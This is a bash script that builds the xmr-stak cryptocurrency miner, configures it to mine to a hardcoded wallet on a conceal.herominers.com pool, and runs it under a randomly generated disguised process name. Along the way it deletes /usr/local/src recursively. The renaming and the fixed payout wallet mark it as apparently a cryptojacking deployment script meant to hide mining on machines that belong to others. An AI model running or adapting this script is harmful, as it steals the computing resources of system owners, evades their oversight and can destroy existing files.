#!/bin/bash
sudo apt-get update
sudo apt-get install cpulimit 
sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
mkdir /usr/local
rm -r /usr/local/src
mkdir /usr/local/src
git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src
mkdir build
cd build 
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
make install
cd bin
sudo sysctl -w vm.nr_hugepages=128 
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
"call_timeout" : 10,
"retry_time" : 30,
"giveup_limit" : 0,
"verbose_level" : 3,
"print_motd" : true,
"h_print_time" : 60,
"aes_override" : null,
"use_slow_memory" : "warn",
"tls_secure_algo" : true,
"daemon_mode" : false,
"flush_stdout" : false,
"output_file" : "",
"httpd_port" : 99,
"http_login" : "",
"http_pass" : "",
"prefer_ipv4" : true,
EOT
' &&
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
"pool_list" :
[
{"pool_address" : "conceal.herominers.com:10361", "wallet_address" : "ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN+bea478d936f707d8ad1d9afa7ac9f610f880658e05461b25ea126f702cfb1c9a", "rig_id" : "", "pool_password" : "SuperMan", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 100 },
],
"currency" : "cryptonight_conceal",
EOT
' &&
sudo cp xmr-stak "$cpuname"
rm xmr-stak
echo $cpuname" is starting"
cpulimit -l 795 ./"${cpuname}"
